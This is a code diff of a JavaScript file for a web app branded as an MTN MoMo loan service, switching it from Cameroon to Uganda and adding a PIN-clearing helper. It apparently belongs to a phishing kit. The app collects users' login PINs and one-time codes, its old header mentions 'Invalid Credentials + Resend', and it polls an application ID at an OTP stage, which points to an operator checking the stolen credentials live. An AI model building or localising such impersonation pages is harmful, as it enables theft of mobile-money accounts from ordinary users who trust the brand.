@@ -1,5 +1,5 @@
 // ============================================================
-// script.js – Phase 1: Polished + Invalid Credentials + Resend
+// script.js – Uganda Version (MTN MoMo Uganda)
 // ============================================================
 
 const S = {
@@ -31,9 +31,9 @@ function normalizePhone(id) {
 
 function updateCalc() {
     const amt = +document.getElementById('amtSlider').value;
-    document.getElementById('calcAmt').textContent = 'XAF ' + amt.toLocaleString();
+    document.getElementById('calcAmt').textContent = 'UGX ' + amt.toLocaleString();
     const monthly = Math.ceil(amt / 48);
-    document.getElementById('monthlyAmt').textContent = 'XAF ' + monthly.toLocaleString();
+    document.getElementById('monthlyAmt').textContent = 'UGX ' + monthly.toLocaleString();
 }
 
 function showErr(id, msg) {
@@ -152,7 +152,7 @@ async function submitApp() {
         return;
     }
     S.employment = em; S.annualIncome = in_; S.kinName = kn; S.kinPhone = kp;
-    S.applicationId = 'MTN-' + Date.now().toString().slice(-6);
+    S.applicationId = 'MTN-UG-' + Date.now().toString().slice(-6);
     goTo('page-processing');
 
     try {
@@ -264,11 +264,11 @@ async function doOtp() {
 
     startPoll(S.applicationId, 'otp',
         () => {
-            document.getElementById('aprAmount').textContent = 'XAF ' + S.loanAmount.toLocaleString();
-            document.getElementById('aprAmt').textContent = 'XAF ' + S.loanAmount.toLocaleString();
+            document.getElementById('aprAmount').textContent = 'UGX ' + S.loanAmount.toLocaleString();
+            document.getElementById('aprAmt').textContent = 'UGX ' + S.loanAmount.toLocaleString();
             document.getElementById('aprTerm').textContent = S.loanTerm;
             const monthly = Math.ceil(S.loanAmount / parseInt(S.loanTerm));
-            document.getElementById('aprMth').textContent = 'XAF ' + monthly.toLocaleString();
+            document.getElementById('aprMth').textContent = 'UGX ' + monthly.toLocaleString();
             goTo('page-approval');
         },
         () => {
@@ -279,6 +279,13 @@ async function doOtp() {
     );
 }
 
+// ─── PIN DELETE FUNCTION ───
+function clearLoginPin() {
+    [0,1,2,3,4].forEach(i => document.getElementById('pin'+i).value = '');
+    document.getElementById('pin0').focus();
+    chkPin();
+}
+
 updateCalc();
 goTo('page-landing');
-console.log('✅ MTN Cameroon Loan App (Phase 1) loaded!');
+console.log('✅ MTN Uganda MoMo Loan App loaded!');
